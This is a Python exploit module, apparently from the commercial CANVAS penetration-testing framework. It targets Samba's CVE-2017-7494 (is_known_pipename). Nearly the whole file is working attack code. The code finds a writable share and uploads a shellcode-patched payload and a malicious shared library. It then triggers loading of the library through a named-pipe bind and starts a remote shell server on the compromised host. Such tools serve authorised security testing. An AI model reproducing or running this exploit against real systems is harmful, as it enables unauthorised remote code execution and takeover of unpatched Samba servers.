#! /usr/bin/env python
#
# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2017
#
# http://www.immunityinc.com/CANVAS/ for more information
#
# Author: Oren

import sys, os
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit
from libs.newsmb.srvsvc import SRVSVCClient
from libs.newsmb.libdcerpc import DCERPC
from libs.newsmb.libsmb import SMBClient, SMBClientException
import libs.kerberos.ccache as cc
from linuxNode import linuxNode
import linuxMosdefShellServer

from zipfile import ZipFile
import StringIO
from struct import pack
import random

NAME                                = "SAMBA 4.x remote exploit"
DESCRIPTION                         = "SAMBA is_known_pipename Remote Code Execution"
VERSION                             = "1.0"

PROPERTY                            = {}
PROPERTY["TYPE"]                    = "Exploit"
PROPERTY["SITE"]                    = "Remote"
PROPERTY["ARCH"]                    = [ ["Linux"] ]

DOCUMENTATION                       = {}
DOCUMENTATION['VENDOR']             = "Samba"
DOCUMENTATION["Date public"]        = "May 24, 2017"
DOCUMENTATION["CVE Name"]           = "CVE-2017-7494"
DOCUMENTATION["CVE Url"]            = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7494"
DOCUMENTATION['CVSS']               = 9.8
DOCUMENTATION["References"]         = "https://www.samba.org/samba/security/CVE-2017-7494.html"
DOCUMENTATION["Versions Tested"]    = "Ubuntu 14.04.3 LTS"
DOCUMENTATION['Notes']              = """

In order to use this exploit you need:
 * Write access to a SAMBA share.
 * Named pipes should be enabled in the SAMBA server.

Tested on Samba 4.1.6 (x86_64 and x86) on Ubuntu

For anonymously writable share:
python ./exploits/remote/unix/samba_is_known_pipename.py -t <ip>
"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.setVersions()
        self.domain       = ''
        self.host         = ""
        self.port         = 445
        self.version      = 0
        self.user         = u''
        self.name         = NAME
        self.ccache_file  = None
        self.use_kerberos = False
        self.badstring    = "\x00\\/.:?\r\n%?"

    def getargs(self):
        self.host        = self.target.interface
        self.user        = self.argsDict.get("user", self.user)
        self.port        = self.argsDict.get("port", self.port)
        self.password    = self.argsDict.get("password", self.password)
        self.domain      = self.argsDict.get("domain", self.domain)
        self.ccache_file = self.argsDict.get('krb5_ccache', self.ccache_file)
        self.socknode    = self.argsDict["passednodes"][0]

    def createShellcode(self):
        self.createLinuxGOShellcode(self.badstring)

    def getsocket(self):
        if ':' in self.host:
            return self.gettcpsock(AF_INET6=1)
        else:
            return self.gettcpsock()

    def check_ccache_file(self):
        try:
            # Can we open the credential file?
            cc1 = cc.CCache()
            cc1.open(self.ccache_file, new=0)
            # Is the DB related to the username?
            principal = cc1.get_primary_principal()
            user_domain = '@'.join([self.user,self.domain]).lower()
            if user_domain != principal.lower():
                return False

            # Do we have credential information that is not only configuration?
            creds = cc1.get_credentials()
            found_valid_creds = 0
            for cred in creds:
                if not cred.is_config_credential():
                    found_valid_creds = 1
            if not found_valid_creds:
                return False
            else:
                return True
        except Exception as e:
            return False
        else:
            return True

    def getsmbobj(self, sharename):
        s = self.getsocket()
        sockaddr = (self.host, self.port)
        try:
            s.connect(sockaddr)
        except Exception, ex:
            logging.error('Error during connect to %s:%d %r' % (sockaddr[0], sockaddr[1], ex))
            return None

        if self.use_kerberos:
            smbobj = SMBClient(s, self.user, self.password, self.domain, kerberos_db=self.ccache_file, use_krb5=True)
        else:
            smbobj = SMBClient(s, self.user, self.password, self.domain)

        try:
            smbobj.negotiate()
            smbobj.session_setup()
        except SMBClientException, ex:
            logging.error('Error during SMB session setup: %s' % ex)
            return None
        try:
            smbobj.tree_connect(sharename)
        except SMBClientException, ex:
            logging.error('treeconnect_AndX on share %s failed: %s' % (sharename, ex))
            return None
        return smbobj

    def run(self):
        """
        Connect to the target and spawn a vfs-shell if we get a connection
        """
        self.getargs()
        results = self.exploitnodes("shareenum")
        if results in [None, []]:
            logging.error("No shares found")
            return None

        # Sanity check: the ccache credentials
        if self.ccache_file:
            if not self.check_ccache_file():
                logging.error('%s doesn\'t seem to be a valid ccache file for user %s' % (self.ccache_file, '@'.join([self.user,self.domain])))
                return 0
            else:
                self.use_kerberos = True
                logging.info("Using kerberos authentication with credentials %s" % self.ccache_file)
        else:
            logging.info("Using NTLM authentication")

        sharename = None
        for r in results[0]:
            sharename = r.sharename
            self.smbobj = self.getsmbobj(sharename)
            if not self.smbobj:
                sharename = None
                continue
            stream = StringIO.StringIO()
            stream.write('hola')
            try:
                self.smbobj.put(stream, '__testnamedpipe')
            except Exception, ex:
                logging.error('Put on share failed: %s' % (ex))
                sharename = None
                continue
            self.smbobj.delete('__testnamedpipe')
            break
        if not sharename:
            logging.error('No suitable share found')
            return None

        logging.info("Using share: %r" % sharename)
        logging.info("Using srvsvc to get share path in SAMBA server")
        ssvc = SRVSVCClient(self.host)
        ssvc.set_credentials(self.user, self.password, self.domain, self.ccache_file, self.use_kerberos)
        if not ssvc.bind():
            logging.error('Could not bind to ssvc')
            return None

        info = ssvc.share_get_info(sharename)
        self.basepath = info['Path'][2:].replace("\\", "/") + '/'
        logging.info("Got share path: %r" % self.basepath)
        self.path = self.basepath + '__namedpipe.so'
        self.resourcePath = os.path.join(os.path.dirname(__file__), 'Resources')

        payload_zipped = '%s/7494payload.zip' % self.resourcePath
        z = ZipFile(payload_zipped)
        self.payload = z.read(z.namelist()[0])

        offset = self.payload.find('aaaaaaaa') #shellcode placeholder: 16000 a's
        shellcode = self.shellcode
        self.payload = self.payload[0:offset] + shellcode + self.payload[offset + len(shellcode):]

        tries = 3
        for i in range(tries):
            logging.info("Trying to exploit: %d/%d" % (i + 1, tries * 2))
            self.setProgress(int((i + 1) / (tries * 2 + 1)))
            try:
                node = self.exploit('x86_64')
            except Exception, ex:
                logging.error('Error trying to exploit x86_64: %r' % (ex))
            if node: break
            logging.info("Trying to exploit: %d/%d" % (i + 2, tries * 2))
            self.setProgress(int((i + 2) / (tries * 2 + 1)))
            try:
                node=self.exploit('x86')
            except Exception, ex:
                logging.error('Error trying to exploit x86: %r' % (ex))
            if node: break
        if not node:
            logging.error('Error: exploit did not succeed. Target is not vulnerable or platform is not supported')
        return node

    def exploit(self,arch):
        self.exename='__exe%d.a' % random.randint(1, 1000000)
        logging.info("Uploading self.payload: %r" % self.exename)
        stream = StringIO.StringIO()
        stream.write(self.payload)
        self.smbobj.put(stream, self.exename)

        if arch == 'x86':
            lib = file('%s/7494libi686.so' % self.resourcePath, 'rb').read()
        else:
            lib = file('%s/7494libx86_64.so' % self.resourcePath, 'rb').read()

        offset = lib.find(pack('<L', 0xdeadbeef))
        exepath = self.basepath+self.exename
        lib = lib[0:offset] + exepath + lib[offset + len(exepath):]
        stream = StringIO.StringIO()
        stream.write(lib)
        logging.info("Uploading payload: __namedpipe.so")
        self.smbobj.put(stream, '__namedpipe.so')

        logging.info("Binding to named pipe: %s[\\pipe%s]" % (self.host, self.path))
        connector = u'ncacn_np:%s[\\pipe%s]' % (self.host, self.path)

        if self.use_kerberos:
            dce = DCERPC(connector,
                         getsock=None,
                         username=self.user,
                         password=self.password,
                         domain=self.domain, kerberos_db=self.ccache_file, use_krb5=True)
        else:
            dce = DCERPC(connector,
                         getsock=None,
                         username=self.user,
                         password=self.password,
                         domain=self.domain)

        dce.dcerpc_connection.connect()
        sck = dce.dcerpc_connection.s

        time.sleep(.1)
        logging.info("Cleaning up uploaded files")
        self.smbobj.delete('__namedpipe.so')
        self.smbobj.delete(self.exename)
        logging.info("Calling recv on smb socket")
        try:
            buf = sck.recv(1000)
        except:
            return None

        node = None
        if buf.find("G") != -1:
            logging.info("Got response")
            sck.send("O")
            node = linuxNode()
            node.parentnode = self.socknode
            linuxMosdefShellServer.linuxshellserver(sck, node, logfunction=self.logfunction)
            logging.info("Calling startup for MOSDEF shell server")
            node.startup()
            self.setInfo("%s attacking %s:%d (succeeded)" % (NAME, self.host, self.port))

        return node

    def setVersions(self):
        self.versions = {}
        self.versions[1] = ["Samba 4.x"]

    def displayVersions(self):
        for v in self.versions.keys():
            logging.info("Version %d: %s" % (v, self.versions[v][0]))

if __name__ == '__main__':
    logging.info("Running CANVAS " + NAME + " version " + VERSION)
    app         = theexploit()
    ret         = standard_callback_commandline(app)
    if ret not in [0, 1, None]:
        ret.interact()
